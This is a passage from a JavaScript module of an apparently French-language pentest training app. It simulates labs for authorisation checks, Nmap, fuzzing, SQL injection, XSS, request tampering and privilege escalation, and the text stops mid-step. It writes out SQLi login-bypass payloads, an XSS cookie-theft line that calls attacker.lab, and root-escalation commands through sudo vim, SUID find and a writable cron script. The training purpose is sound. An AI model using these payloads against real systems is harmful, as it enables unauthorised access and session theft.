import { esc, toast, copyText } from '../ui.js';
import { completeLab, runLab } from '../store.js';
import { CVSS_METRICS, DEFAULT_CVSS, computeCvss, cvssExamples } from '../cvss.js';

/* ------------------------------------------------------------------ */
/* utilitaires                                                         */
/* ------------------------------------------------------------------ */

function typeLines(container, lines, done, speed = 45) {
  let i = 0;
  const step = () => {
    if (i >= lines.length) { if (done) done(); return; }
    const l = lines[i++];
    const div = document.createElement('div');
    div.className = 'term-line';
    div.innerHTML = l;
    container.appendChild(div);
    container.scrollTop = container.scrollHeight;
    setTimeout(step, speed);
  };
  step();
}

function feedLine(html) {
  const div = document.createElement('div');
  div.className = 'term-line';
  div.innerHTML = html;
  return div;
}

const LAB_META = [
  { id: 'legal', title: "Checklist d'autorisation", tag: 'Cadre légal', icon: '⚖️', desc: "Vérifiez que la mission est juridiquement encadrée avant le premier paquet." },
  { id: 'nmap', title: "Simulateur Nmap", tag: 'Reconnaissance', icon: '🛰️', desc: "Scannez une cible de lab, lisez la sortie et identifiez le service critique." },
  { id: 'fuzz', title: "Fuzzing d'endpoints", tag: 'Énumération', icon: '⚡', desc: "Lancez FFUF ou Gobuster et repérez l'endpoint le plus dangereux." },
  { id: 'sqli', title: "Contournement de login (SQLi)", tag: 'Injection', icon: '💉', desc: "Testez une injection dans un formulaire vulnérable, puis activez la protection." },
  { id: 'xss', title: "Livre d'or XSS", tag: 'XSS', icon: '🧬', desc: "Comparez le rendu vulnérable et le rendu encodé d'un commentaire." },
  { id: 'burp', title: "Interception & falsification", tag: 'Burp Suite', icon: '🕵️', desc: "Modifiez une requête HTTP brute et observez l'impact côté serveur." },
  { id: 'privesc', title: "Élévation de privilèges", tag: 'Post-exploitation', icon: '🔺', desc: "Analysez une VM de lab et choisissez le bon chemin vers root." },
  { id: 'cvss', title: "Calculateur CVSS v3.1", tag: 'Reporting', icon: '📊', desc: "Scorez une vulnérabilité avec la formule officielle et générez son vecteur." },
  { id: 'headers', title: "Durcissement HTTP", tag: 'Défense', icon: '🛡️', desc: "Activez les en-têtes de sécurité et faites grimper la note du serveur." },
  { id: 'identity', title: "Traceur IP, MAC & IMEI", tag: 'Identité réseau', icon: '📡', desc: "Analysez trois identifiants et distinguez ce qui est réellement traçable." }
];

/* ------------------------------------------------------------------ */
/* LAB 1 — checklist juridique                                         */
/* ------------------------------------------------------------------ */

const legalItems = [
  "Lettre d'autorisation signée par un représentant habilité",
  "Périmètre écrit : domaines, IP, applications, exclusions",
  "Fenêtre horaire et fuseau horaire définis",
  "Contacts d'urgence 24/7 et procédure d'arrêt immédiat",
  "Adresses IP sources des testeurs déclarées au client",
  "Techniques interdites listées (DoS, ingénierie sociale, destruction)",
  "NDA et politique de traitement / suppression des données",
  "Sauvegarde et validation préalable avec le client",
  "Canal sécurisé pour les preuves et les rapports",
  "Plan de remédiation et de retest convenu"
];

function labLegal(body, api) {
  body.innerHTML = `
    <p class="lab-note">Cochez uniquement ce que vous possédez <b>réellement</b>. Un seul élément manquant suffit à rendre la mission non conforme.</p>
    <div class="checklist mt-2" id="legal-list">
      ${legalItems.map((t, i) => `
        <label class="check" style="align-items:flex-start;padding:8px 0">
          <input type="checkbox" data-i="${i}">
          <span style="color:var(--muted)">${esc(t)}</span>
        </label>`).join('')}
    </div>
    <div class="card pad-sm mt-2" style="background:var(--bg-2)">
      <div class="flex-between mb-1"><span class="small muted">Couverture juridique</span><b class="mono" id="legal-score">0 %</b></div>
      <div class="bar"><i id="legal-bar" style="width:0%"></i></div>
      <div id="legal-verdict" class="small mt-2" style="color:var(--amber)">Aucun élément validé. La mission ne peut pas commencer.</div>
    </div>`;

  const boxes = Array.from(body.querySelectorAll('#legal-list input'));
  const update = () => {
    const n = boxes.filter((b) => b.checked).length;
    const p = Math.round((n / boxes.length) * 100);
    body.querySelector('#legal-score').textContent = `${p} %`;
    body.querySelector('#legal-bar').style.width = `${p}%`;
    const v = body.querySelector('#legal-verdict');
    if (n === boxes.length) {
      v.style.color = 'var(--lime)';
      v.innerHTML = "<b>Cadre complet.</b> La mission est documentée. Conservez la lettre d'autorisation sur vous pendant toute la durée du test.";
      api.done('Cadre légal validé');
    } else if (n >= 7) {
      v.style.color = 'var(--amber)';
      v.innerHTML = `<b>${boxes.length - n} élément(s) manquant(s).</b> Ne commencez pas : complétez les documents avant toute action technique.`;
    } else {
      v.style.color = 'var(--red)';
      v.innerHTML = `<b>${boxes.length - n} élément(s) manquant(s).</b> Risque juridique majeur. Aucun test ne doit être lancé.`;
    }
  };
  boxes.forEach((b) => b.addEventListener('change', update));
}

/* ------------------------------------------------------------------ */
/* LAB 2 — Nmap                                                        */
/* ------------------------------------------------------------------ */

const NMAP_TARGETS = {
  legacy: {
    ip: '10.10.10.5', name: 'legacy.lab',
    ports: [
      { port: 21, state: 'open', svc: 'ftp', version: 'vsftpd 2.3.4', note: 'backdoor connue (CVE-2011-2523)' },
      { port: 22, state: 'open', svc: 'ssh', version: 'OpenSSH 7.2p2 Ubuntu', note: 'ancien mais sans CVE critique directe' },
      { port: 80, state: 'open', svc: 'http', version: 'Apache httpd 2.4.49', note: 'CVE-2021-41773 path traversal / RCE' },
      { port: 3306, state: 'open', svc: 'mysql', version: 'MySQL 5.7.33', note: 'exposé : à vérifier (accès distant ?)' }
    ],
    question: "Quel service constitue la piste prioritaire ?",
    options: ['FTP vsftpd 2.3.4', 'Apache httpd 2.4.49', 'MySQL 5.7.33', 'OpenSSH 7.2p2'],
    answer: 1,
    explain: "Apache 2.4.49 est vulnérable à CVE-2021-41773 (path traversal, RCE si mod_cgi actif). vsftpd 2.3.4 est aussi une piste, mais le service web expose directement l'application et permet souvent l'exécution de code."
  },
  dvwa: {
    ip: '10.10.10.6', name: 'dvwa.lab',
    ports: [
      { port: 22, state: 'open', svc: 'ssh', version: 'OpenSSH 8.9p1', note: 'à jour' },
      { port: 80, state: 'open', svc: 'http', version: 'nginx 1.18.0 (PHP/7.4.33)', note: 'application DVWA intentionnellement vulnérable' },
      { port: 8080, state: 'open', svc: 'http-proxy', version: 'Apache Tomcat 9.0.30', note: 'manager exposé, credentials par défaut possibles' }
    ],
    question: "Quel élément mérite votre attention immédiate ?",
    options: ['Le serveur SSH 8.9p1', 'Le manager Tomcat exposé sur 8080', 'Nginx 1.18', 'Le port 22 filtré'],
    answer: 1,
    explain: "Un manager Tomcat accessible est une surface d'administration critique : credentials par défaut, déploiement de WAR, prise de contrôle. Vérifiez les accès et l'authentification avant tout."
  },
  juice: {
    ip: '10.10.10.7', name: 'juiceshop.lab',
    ports: [
      { port: 22, state: 'open', svc: 'ssh', version: 'OpenSSH 8.2p1', note: 'à jour' },
      { port: 3000, state: 'open', svc: 'http', version: 'Node.js Express (OWASP Juice Shop)', note: 'application de lab volontairement vulnérable' },
      { port: 443, state: 'open', svc: 'https', version: 'nginx 1.20 (TLS 1.3)', note: 'en-têtes de sécurité à vérifier' }
    ],
    question: "Quelle est la meilleure première action ?",
    options: [
      'Brute force SSH avec Hydra',
      'Cartographier l\'application Juice Shop sur 3000 (routes, API, JWT)',
      'Lancer un scan de vulnérabilités noyau',
      'Tester une injection SQL sur le port 22'
    ],
    answer: 1,
    explain: "Les applications de lab comme Juice Shop sont conçues pour être attaquées au niveau applicatif (API, JWT, IDOR, injections). Cartographiez d'abord les routes et l'API avant de tester."
  }
};

function labNmap(body, api) {
  body.innerHTML = `
    <div class="lab-grid">
      <div>
        <label class="field"><span>Cible de laboratoire</span>
          <select id="nm-target">
            <option value="legacy">legacy.lab — 10.10.10.5</option>
            <option value="dvwa">dvwa.lab — 10.10.10.6</option>
            <option value="juice">juiceshop.lab — 10.10.10.7</option>
          </select>
        </label>
        <label class="field"><span>Stratégie</span>
          <select id="nm-profile">
            <option value="quick">Rapide — top 1000 ports + versions</option>
            <option value="discovery">Découverte — -sn</option>
            <option value="full">Complet — tous les ports</option>
            <option value="vuln">Scripts NSE vuln</option>
          </select>
        </label>
        <button class="btn btn-primary btn-block" id="nm-run" type="button">▶ Lancer le scan</button>
        <p class="lab-note mt-2">Simulation : aucune requête réseau réelle n'est émise.</p>
      </div>
      <div>
        <div class="term"><div class="term-head">nmap — sortie</div><div class="term-body" id="nm-out" style="min-height:230px"><span class="mut">En attente…</span></div></div>
      </div>
    </div>
    <div id="nm-quiz" class="mt-2"></div>`;

  const out = body.querySelector('#nm-out');
  const runBtn = body.querySelector('#nm-run');
  const quiz = body.querySelector('#nm-quiz');

  runBtn.addEventListener('click', () => {
    const key = body.querySelector('#nm-target').value;
    const profile = body.querySelector('#nm-profile').value;
    const t = NMAP_TARGETS[key];
    runLab('nmap');
    out.innerHTML = '';
    const cmd = profile === 'discovery'
      ? `nmap -sn 10.10.10.0/24`
      : profile === 'full'
        ? `nmap -sS -p- -sV -T4 ${t.ip}`
        : profile === 'vuln'
          ? `nmap -sV --script vuln ${t.ip}`
          : `nmap -sS -sV --top-ports 1000 -T3 ${t.ip}`;
    out.appendChild(feedLine(`<span class="p">$</span> <span class="cmd">${esc(cmd)}</span>`));
    runBtn.disabled = true;

    let lines;
    if (profile === 'discovery') {
      lines = [
        '##Starting Nmap 7.94 ( https://nmap.org )',
        'Nmap scan report for gateway.lab (10.10.10.1)',
        'Host is up (0.0012s latency).',
        `Nmap scan report for ${t.name} (${t.ip})`,
        'Host is up (0.00084s latency).',
        '..Nmap done: 256 IP addresses (3 hosts up) scanned in 2.41 seconds',
        '<span class="ok">→ 3 hôtes actifs : passerelle, cible, honeypot</span>'
      ];
    } else {
      lines = [
        '##Starting Nmap 7.94 ( https://nmap.org )',
        `Nmap scan report for ${t.name} (${t.ip})`,
        'Host is up (0.00091s latency).',
        'Not shown: 997 closed tcp ports (reset)',
        'PORT     STATE SERVICE VERSION'
      ];
      t.ports.forEach((p) => {
        lines.push(`${String(p.port).padEnd(8)} <span class="ok">open</span>  ${p.svc.padEnd(7)} ${esc(p.version)}`);
      });
      lines.push('..Service detection performed. Please report any incorrect results at https://nmap.org/submit/.');
      lines.push('..Nmap done: 1 IP address (1 host up) scanned in 8.72 seconds');
      if (profile === 'vuln') {
        lines.push('<span class="err">| http-vuln-cve2021-41773: VULNERABLE</span>');
        lines.push('<span class="warn">|   Path traversal in Apache 2.4.49 (CVE-2021-41773)</span>');
      }
      lines.push('<span class="hl">→ Analyser les versions : une seule suffit pour entrer.</span>');
    }
    typeLines(out, lines, () => {
      runBtn.disabled = false;
      quiz.innerHTML = `
        <div class="card pad-sm" style="background:var(--bg-2)">
          <h4 class="mt-0">Question d'analyse — ${esc(t.name)}</h4>
          <p class="small muted">${esc(t.question)}</p>
          <div class="q-opts" id="nm-opts">
            ${t.options.map((o, i) => `<button class="q-opt" type="button" data-i="${i}"><span class="q-key">${String.fromCharCode(65 + i)}</span><span>${esc(o)}</span></button>`).join('')}
          </div>
          <div id="nm-fb" class="mt-2"></div>
        </div>`;
      quiz.querySelectorAll('#nm-opts .q-opt').forEach((btn) => {
        btn.addEventListener('click', () => {
          const i = Number(btn.dataset.i);
          const ok = i === t.answer;
          quiz.querySelectorAll('.q-opt').forEach((b, bi) => {
            b.disabled = true;
            if (bi === t.answer) b.classList.add('correct');
            if (bi === i && !ok) b.classList.add('wrong');
          });
          quiz.querySelector('#nm-fb').innerHTML = `<div class="q-explain"><b>${ok ? 'Exact.' : 'Pas tout à fait.'}</b> ${esc(t.explain)}</div>`;
          if (ok) api.done('Analyse Nmap');
        });
      });
    }, 55);
  });
}

/* ------------------------------------------------------------------ */
/* LAB 3 — fuzzing                                                     */
/* ------------------------------------------------------------------ */

const FUZZ_RESULTS = [
  { path: '/about', code: 200, size: 3120, note: 'page statique' },
  { path: '/contact', code: 200, size: 2980, note: 'page statique' },
  { path: '/admin', code: 403, size: 1240, note: 'protégé — à contourner ?' },
  { path: '/admin/login', code: 200, size: 2210, note: 'formulaire de connexion' },
  { path: '/backup/db.sql', code: 200, size: 51200, note: 'dump SQL exposé' },
  { path: '/api/v1/users', code: 200, size: 8420, note: 'JSON sans authentification' },
  { path: '/.git/config', code: 200, size: 312, note: 'dépôt Git exposé' },
  { path: '/server-status', code: 403, size: 1240, note: 'protégé' },
  { path: '/css/app.css', code: 200, size: 1240, note: 'asset' },
  { path: '/ZZZ-not-found', code: 404, size: 1240, note: 'référence 404' }
];

function labFuzz(body, api) {
  body.innerHTML = `
    <div class="grid grid-2" style="gap:14px">
      <label class="field"><span>Outil</span>
        <select id="fz-tool">
          <option value="ffuf">ffuf</option>
          <option value="gobuster">gobuster</option>
          <option value="dirsearch">dirsearch</option>
        </select>
      </label>
      <label class="field"><span>Filtre</span>
        <select id="fz-filter">
          <option value="none">Aucun filtre</option>
          <option value="size">Filtrer la taille 1240 (-fs 1240)</option>
          <option value="code">Filtrer 404 uniquement (-fc 404)</option>
        </select>
      </label>
    </div>
    <button class="btn btn-primary" id="fz-run" type="button">▶ Lancer l'énumération</button>
    <div class="term mt-2"><div class="term-head">fuzzing — résultats</div><div class="term-body" id="fz-out" style="min-height:150px"><span class="mut">En attente…</span></div></div>
    <div id="fz-quiz" class="mt-2"></div>`;

  const out = body.querySelector('#fz-out');
  const btn = body.querySelector('#fz-run');

  btn.addEventListener('click', () => {
    const tool = body.querySelector('#fz-tool').value;
    const filter = body.querySelector('#fz-filter').value;
    runLab('fuzz');
    out.innerHTML = '';
    btn.disabled = true;

    const cmd = tool === 'ffuf'
      ? `ffuf -u https://shop.lab/FUZZ -w raft-medium.txt ${filter === 'size' ? '-fs 1240' : filter === 'code' ? '-fc 404' : ''} -t 40`
      : tool === 'gobuster'
        ? `gobuster dir -u https://shop.lab -w raft-medium.txt ${filter === 'size' ? '--exclude-length 1240' : ''}`
        : `dirsearch -u https://shop.lab -e php,json,bak,sql ${filter === 'code' ? '-x 404' : ''}`;

    out.appendChild(feedLine(`<span class="p">$</span> <span class="cmd">${esc(cmd.replace(/\s+/g, ' '))}</span>`));
    out.appendChild(feedLine('<span class="mut">[########################################] 100% — 4 612 requêtes</span>'));

    let results = FUZZ_RESULTS.slice();
    if (filter === 'code') results = results.filter((r) => r.code !== 404);
    if (filter === 'size') results = results.filter((r) => !(r.size === 1240 && r.code !== 200));

    if (tool === 'ffuf') {
      results.forEach((r) => {
        const cls = r.code === 200 ? 'ok' : r.code === 403 ? 'warn' : 'mut';
        out.appendChild(feedLine(`<span class="${cls}">${r.code}</span>  ${String(r.size).padStart(7)} B  <span class="hl">${esc(r.path)}</span>  <span class="mut">${esc(r.note)}</span>`));
      });
    } else if (tool === 'gobuster') {
      results.forEach((r) => {
        out.appendChild(feedLine(`<span class="ok">${esc(r.path)}</span> <span class="mut">(Status: ${r.code}) [Size: ${r.size}]</span>`));
      });
    } else {
      results.forEach((r) => {
        const cls = r.code === 200 ? 'ok' : r.code === 403 ? 'warn' : 'mut';
        out.appendChild(feedLine(`[${String(r.code).padStart(2)}] <span class="${cls}">${esc(r.path)}</span> — ${r.size} B`));
      });
    }

    out.appendChild(feedLine(`<span class="hl">→ ${results.length} entrées retenues. Analysez-les maintenant.</span>`));
    btn.disabled = false;

    const quiz = body.querySelector('#fz-quiz');
    quiz.innerHTML = `
      <div class="card pad-sm" style="background:var(--bg-2)">
        <h4 class="mt-0">Quel résultat est le plus critique ?</h4>
        <div class="q-opts">
          ${['/admin (403)', '/backup/db.sql (200)', '/.git/config (200)', '/admin/login (200)'].map((o, i) => `<button class="q-opt" type="button" data-i="${i}"><span class="q-key">${String.fromCharCode(65 + i)}</span><span>${esc(o)}</span></button>`).join('')}
        </div>
        <div id="fz-fb"></div>
      </div>`;
    quiz.querySelectorAll('.q-opt').forEach((b) => {
      b.addEventListener('click', () => {
        const i = Number(b.dataset.i);
        const ok = i === 1;
        quiz.querySelectorAll('.q-opt').forEach((x, xi) => {
          x.disabled = true;
          if (xi === 1) x.classList.add('correct');
          if (xi === i && !ok) x.classList.add('wrong');
        });
        quiz.querySelector('#fz-fb').innerHTML = `<div class="q-explain"><b>${ok ? 'Bien vu.' : 'Non.'}</b> Un dump SQL accessible sans authentification livre toute la base : comptes, emails, données de paiement. Un 403 sur /admin est une piste, mais /backup/db.sql est une compromission immédiate. Le dépôt .git exposé permet aussi de reconstruire le code source.</div>`;
        if (ok) api.done('Fuzzing');
      });
    });
  });
}

/* ------------------------------------------------------------------ */
/* LAB 4 — SQLi                                                        */
/* ------------------------------------------------------------------ */

function labSqli(body, api) {
  body.innerHTML = `
    <div class="grid grid-2" style="gap:18px;align-items:start">
      <div class="mock-login">
        <div class="ml-logo">◈</div>
        <h4>ACME — Espace client</h4>
        <label class="field"><span>Utilisateur</span><input type="text" id="sq-user" placeholder="admin" autocomplete="off"></label>
        <label class="field"><span>Mot de passe</span><input type="text" id="sq-pass" placeholder="••••••••" autocomplete="off"></label>
        <button class="btn btn-primary btn-block" id="sq-go" type="button">Se connecter</button>
        <div id="sq-out"></div>
        <label class="check mt-2"><input type="checkbox" id="sq-safe"><span>Activer la correction (requête préparée)</span></label>
      </div>
      <div>
        <div class="panel-mock">
          <div class="pm-head"><span class="ok">●</span> requête générée côté serveur</div>
          <div class="pm-body" id="sq-sql"></div>
        </div>
        <div class="callout tip mt-2" style="font-size:12.5px">
          <span class="co-ico">💡</span>
          <div><b class="co-title">Payloads à essayer</b>
          <code>' OR '1'='1' -- -</code><br>
          <code>admin'-- -</code><br>
          <code>' OR 1=1 #</code></div>
        </div>
      </div>
    </div>`;

  const user = body.querySelector('#sq-user');
  const pass = body.querySelector('#sq-pass');
  const safe = body.querySelector('#sq-safe');
  const outEl = body.querySelector('#sq-out');
  const sqlEl = body.querySelector('#sq-sql');

  const renderQuery = () => {
    const u = user.value || 'USER';
    const p = pass.value || 'PASS';
    if (safe.checked) {
      sqlEl.innerHTML = `SELECT id, role FROM users
WHERE username = <span class="val">?</span>
  AND password_hash = <span class="val">?</span>

<span class="mut">-- paramètres liés :</span>
$1 = <span class="val">${esc(u)}</span>
$2 = <span class="val">${esc(p)}</span>`;
    } else {
      sqlEl.innerHTML = `SELECT id, role FROM users
WHERE username = <span class="val">'${esc(u)}'</span>
  AND password = <span class="val">'${esc(p)}'</span>`;
    }
  };

  [user, pass].forEach((i) => i.addEventListener('input', renderQuery));
  safe.addEventListener('change', () => { renderQuery(); outEl.innerHTML = ''; });
  renderQuery();

  body.querySelector('#sq-go').addEventListener('click', () => {
    runLab('sqli');
    const u = user.value;
    const p = pass.value;
    if (safe.checked) {
      const ok = u === 'admin' && p === 'password123';
      outEl.className = `mock-out ${ok ? 'ok' : 'no'}`;
      outEl.innerHTML = ok
        ? 'Connexion réussie — admin (la saisie a été traitée comme une donnée, pas comme du SQL).'
        : "Identifiants invalides. La charge utile reste une simple chaîne de caractères : la requête n'est pas modifiée.";
      return;
    }
    if (u === 'admin' && p === 'password123') {
      outEl.className = 'mock-out ok';
      outEl.textContent = 'Connexion réussie — bienvenue admin.';
      return;
    }
    const norm = `${u} ${p}`.toLowerCase();
    const tautology = /('|\")?\s*or\s+('?\d+'?\s*=\s*'?\d+'?|'[^']*'\s*=\s*'[^']*')/.test(norm);
    const comment = /(--|#|\/\*)/.test(norm) && /admin|'/.test(norm);
    const bypass = tautology || comment || u.includes("' OR ") || u.includes("'or ");
    if (bypass) {
      outEl.className = 'mock-out ok';
      outEl.innerHTML = `<b>Contournement réussi.</b> La condition injectée rend la clause WHERE toujours vraie : le premier utilisateur de la table est retourné (<code>admin</code>).`;
      api.done('SQLi — contournement');
    } else {
      outEl.className = 'mock-out no';
      outEl.textContent = 'Identifiants invalides.';
    }
  });
}

/* ------------------------------------------------------------------ */
/* LAB 5 — XSS                                                         */
/* ------------------------------------------------------------------ */

function labXss(body, api) {
  body.innerHTML = `
    <div class="grid grid-2" style="gap:16px;align-items:start">
      <div>
        <label class="field"><span>Nom affiché</span><input type="text" id="x-name" value="visiteur" maxlength="40"></label>
        <label class="field"><span>Message</span><textarea id="x-msg" rows="3" placeholder="Votre message…">&lt;img src=x onerror="console.log(document.cookie)"&gt;</textarea></label>
        <div class="flex flex-wrap">
          <button class="btn btn-primary" id="x-post" type="button">Publier</button>
          <label class="check" style="margin:0"><input type="checkbox" id="x-safe"><span>Encodage activé</span></label>
        </div>
        <p class="lab-note mt-2">Rien n'est exécuté : le simulateur montre ce que le navigateur interpréterait.</p>
      </div>
      <div>
        <div class="panel-mock">
          <div class="pm-head"><span class="ok">●</span> livre d'or — rendu</div>
          <div class="pm-body" id="x-feed" style="font-family:var(--sans);font-size:13px">Aucun message.</div>
        </div>
        <div id="x-impact" class="mt-2"></div>
      </div>
    </div>`;

  const feed = body.querySelector('#x-feed');
  const impact = body.querySelector('#x-impact');
  const messages = [];

  body.querySelector('#x-post').addEventListener('click', () => {
    runLab('xss');
    const name = body.querySelector('#x-name').value || 'anonyme';
    const msg = body.querySelector('#x-msg').value;
    const safe = body.querySelector('#x-safe').checked;
    const dangerous = /<\s*script|onerror\s*=|onload\s*=|javascript\s*:|<\s*img|<\s*svg|document\.cookie|fetch\s*\(/i.test(msg);

    messages.unshift({ name, msg, safe });
    feed.innerHTML = messages.slice(0, 4).map((m) => {
      if (m.safe) {
        return `<div style="padding:8px 0;border-bottom:1px solid var(--line)"><b>${esc(m.name)}</b><br><span style="color:var(--muted)">${esc(m.msg)}</span></div>`;
      }
      return `<div style="padding:8px 0;border-bottom:1px solid var(--line)"><b>${esc(m.name)}</b><br><span style="color:var(--muted)">${esc(m.msg)}</span></div>`;
    }).join('');

    if (safe) {
      impact.innerHTML = `<div class="callout tip" style="margin:0"><span class="co-ico">🛡️</span><div><b class="co-title">Sortie encodée</b>Le serveur a transformé <code>&lt;</code> en <code>&amp;lt;</code>. Le navigateur affiche le texte, il ne crée aucun élément ni gestionnaire d'événement. <code>textContent</code> et l'échappement HTML sont déterministes.</div></div>`;
      return;
    }
    if (!dangerous) {
      impact.innerHTML = `<div class="callout info" style="margin:0"><span class="co-ico">ℹ</span><div><b class="co-title">Aucune charge détectée</b>Essayez un payload avec <code>&lt;img onerror=…&gt;</code> ou <code>&lt;script&gt;</code> pour voir la différence entre <code>innerHTML</code> et un rendu sûr.</div></div>`;
      return;
    }

    const fakeCookie = /document\.cookie/i.test(msg) ? 'session=eyJ1aWQiOjEwNDJ9; role=user' : null;
    impact.innerHTML = `
      <div class="callout danger" style="margin:0 0 10px"><span class="co-ico">☠</span><div><b class="co-title">XSS simulé (stocké)</b>Le commentaire est enregistré puis injecté via <code>innerHTML</code> : le navigateur créerait un nœud HTML et exécuterait le gestionnaire d'événement pour chaque visiteur.</div></div>
      <div class="panel-mock"><div class="pm-head"><span class="err">●</span> ce que le navigateur exécuterait</div><div class="pm-body">${esc(msg)}</div></div>
      ${fakeCookie ? `<div class="panel-mock mt-2"><div class="pm-head"><span class="err">●</span> cookie exfiltré (simulation)</div><div class="pm-body">fetch('https://attacker.lab/?c=' + encodeURIComponent(document.cookie))<br><br><span class="err">${esc(fakeCookie)}</span></div></div>` : ''}
      <div class="callout tip mt-2" style="margin:0"><span class="co-ico">🛡️</span><div><b class="co-title">Correction</b>Encodage contextuel à la sortie, <code>HttpOnly</code> sur le cookie de session, et CSP stricte. Le stockage doit aussi être validé à l'entrée, mais l'encodage de sortie est la barrière décisive.</div></div>`;
    api.done('XSS simulé');
  });
}

/* ------------------------------------------------------------------ */
/* LAB 6 — Burp / falsification                                        */
/* ------------------------------------------------------------------ */

function labBurp(body, api) {
  const initial = `GET /api/orders/1042 HTTP/1.1
Host: shop.lab
Cookie: session=alice-token
X-User-Id: 1042
Accept: application/json

{"price":"249.00","qty":1}`;

  body.innerHTML = `
    <p class="lab-note">Éditez la requête brute comme dans Repeater : changez l'identifiant, le prix ou ajoutez un en-tête. Puis envoyez.</p>
    <div class="lab-grid">
      <div>
        <textarea id="b-req" rows="13" spellcheck="false" style="font-family:var(--mono);font-size:12.3px;line-height:1.6">${esc(initial)}</textarea>
        <div class="flex mt-2">
          <button class="btn btn-primary" id="b-send" type="button">▶ Envoyer</button>
          <button class="btn btn-ghost" id="b-reset" type="button">Réinitialiser</button>
        </div>
      </div>
      <div>
        <div class="panel-mock">
          <div class="pm-head"><span class="ok">●</span> réponse du serveur</div>
          <div class="pm-body" id="b-res">Envoyez une requête…</div>
        </div>
        <div id="b-note" class="mt-2"></div>
      </div>
    </div>`;

  const req = body.querySelector('#b-req');
  const res = body.querySelector('#b-res');
  const note = body.querySelector('#b-note');

  body.querySelector('#b-reset').addEventListener('click', () => { req.value = initial; res.textContent = 'Envoyez une requête…'; note.innerHTML = ''; });

  body.querySelector('#b-send').addEventListener('click', () => {
    runLab('burp');
    const raw = req.value;
    const line = raw.split('\n')[0] || '';
    const path = (line.split(' ')[1] || '/');
    const priceMatch = raw.match(/"price"\s*:\s*"?([\d.]+)"?/);
    const price = priceMatch ? priceMatch[1] : '249.00';
    const userMatch = raw.match(/X-User-Id:\s*(\d+)/i);
    const uid = userMatch ? userMatch[1] : '1042';
    const cookieMatch = raw.match(/Cookie:\s*(.*)/i);
    const cookie = cookieMatch ? cookieMatch[1] : '';
    const xff = /X-Forwarded-For:\s*127\.0\.0\.1/i.test(raw);
    const adminPath = /\/admin/.test(path);
    const isBob = uid === '1043' || /bob/i.test(cookie);

    if (adminPath) {
      if (xff) {
        res.innerHTML = `<span class="ok">HTTP/1.1 200 OK</span>
Content-Type: application/json

{ "panel": "admin", "users": 1204, "note": "accès accordé via X-Forwarded-For" }`;
        note.innerHTML = `<div class="callout danger" style="margin:0"><span class="co-ico">☠</span><div><b class="co-title">Contournement d'accès admin</b>Le serveur fait confiance à <code>X-Forwarded-For</code> fourni par le client. Un attaquant ajoute cet en-tête et passe pour localhost. Ne jamais utiliser un en-tête client pour une décision d'autorisation.</div></div>`;
        api.done('Contournement admin');
      } else {
        res.innerHTML = `<span class="err">HTTP/1.1 403 Forbidden</span>
Content-Type: application/json

{ "error": "admin only" }`;
        note.innerHTML = `<div class="callout info" style="margin:0"><span class="co-ico">ℹ</span><div><b class="co-title">Piste</b>L'endpoint existe (403, pas 404). Testez des en-têtes de proxy, des rôles, des cookies alternatifs — en lab.</div></div>`;
      }
      return;
    }

    if (price !== '249.00' && !isBob) {
      res.innerHTML = `<span class="ok">HTTP/1.1 200 OK</span>
Content-Type: application/json

{ "order": 1042, "user": "alice", "price": "${esc(price)}", "status": "paid" }`;
      note.innerHTML = `<div class="callout danger" style="margin:0"><span class="co-ico">☠</span><div><b class="co-title">Falsification de prix acceptée</b>Le prix est lu depuis le corps de la requête sans être recalculé côté serveur. Le client peut payer 0.01 €. Le montant doit toujours être déterminé par le serveur à partir du catalogue.</div></div>`;
      api.done('Falsification de prix');
      return;
    }

    if (isBob) {
      res.innerHTML = `<span class="ok">HTTP/1.1 200 OK</span>
Content-Type: application/json

{ "order": ${esc(uid)}, "user": "bob", "email": "bob@lab", "total": "89.00" }`;
      note.innerHTML = `<div class="callout danger" style="margin:0"><span class="co-ico">☠</span><div><b class="co-title">IDOR confirmé</b>Le même jeton (alice) accède à la commande de bob. Le serveur vérifie l'authentification mais pas la propriété de l'objet. Correction : contrôle d'accès serveur sur chaque objet, par utilisateur et par tenant.</div></div>`;
      api.done('IDOR');
      return;
    }

    res.innerHTML = `<span class="ok">HTTP/1.1 200 OK</span>
Content-Type: application/json

{ "order": 1042, "user": "alice", "price": "249.00", "status": "paid" }`;
    note.innerHTML = `<div class="callout info" style="margin:0"><span class="co-ico">ℹ</span><div><b class="co-title">Réponse de référence</b>Modifiez <code>X-User-Id</code> en 1043, changez <code>"price"</code>, ou appelez <code>/admin</code> avec <code>X-Forwarded-For: 127.0.0.1</code>.</div></div>`;
  });
}

/* ------------------------------------------------------------------ */
/* LAB 7 — privesc                                                     */
/* ------------------------------------------------------------------ */

const PRIVESC_STEPS = [
  {
    title: "Étape 1 — sudo -l",
    output: `$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ sudo -l
Matching Defaults entries for www-data on lab:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User www-data may run the following commands on lab:
    (root) NOPASSWD: /usr/bin/vim`,
    q: "Quelle action mène à root ?",
    options: [
      "Lancer `sudo vim` puis `:!/bin/sh`",
      "Lire /etc/shadow directement",
      "Utiliser `sudo -i` sans mot de passe",
      "Redémarrer le service nginx"
    ],
    answer: 0,
    explain: "vim autorisé en sudo permet d'exécuter une commande shell depuis l'éditeur : `sudo vim -c ':!/bin/sh'`. GTFOBins documente ce type d'échappement."
  },
  {
    title: "Étape 2 — binaires SUID",
    output: `$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/find
/usr/lib/openssh/ssh-keysign`,
    q: "Quel binaire est exploitable et comment ?",
    options: [
      "passwd : modifier le mot de passe root",
      "find : `find . -exec /bin/sh -p \\; -quit`",
      "su : devient root sans mot de passe",
      "ssh-keysign : lire les clés privées"
    ],
    answer: 1,
    explain: "find avec le bit SUID root permet d'exécuter un shell en conservant l'euid root : `find . -exec /bin/sh -p \\; -quit`. Les autres binaires sont normaux et protégés."
  },
  {
    title: "Étape 3 — tâche planifiée",
    output: `$ ls -la /opt/backup.sh /etc/cron.d/backup
-rwxrwxrwx 1 root root  182 Nov  4 09:12 /opt/backup.sh
-rw-r--r-- 1 root root   71 Nov  4 09:12 /etc/cron.d/backup

$ cat /etc/cron.d/backup
*/2 * * * * root /opt/backup.sh

$ cat /opt/backup.sh
#!/bin/bash
tar czf /var/backups/site.tgz /var/www`,
    q: "Quelle est l'exploitation correcte en lab ?",
    options: [
      "Modifier /opt/backup.sh pour copier bash en SUID root",
      "Supprimer la tâche cron",
      "Changer les droits de /var/www",
      "Lire /etc/crontab"
    ],
    answer: 0,
